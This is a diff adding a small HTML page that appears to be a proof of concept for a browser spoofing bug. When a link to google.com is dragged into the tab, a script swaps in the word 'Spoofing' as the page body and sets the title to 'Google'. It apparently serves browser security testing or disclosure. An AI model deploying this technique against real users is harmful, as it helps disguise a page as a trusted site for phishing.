@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Draggable Link Example</title>
+    <script>
+        function setData(e) {
+            e.dataTransfer.setData("text/plain", e.target.href);
+        }
+
+        document.addEventListener("dragend", function () {
+            document.body.innerHTML = '<b>Spoofing</b>';
+            document.title = 'Google';
+        });
+    </script>
+</head>
+<body>
+    <p>Drag and drop the link to the current TAB:</p>
+    <a id="bb" draggable="true" ondragstart="setData(event)" href="https://www.google.com/">www.google.com</a>
+</body>
+</html>
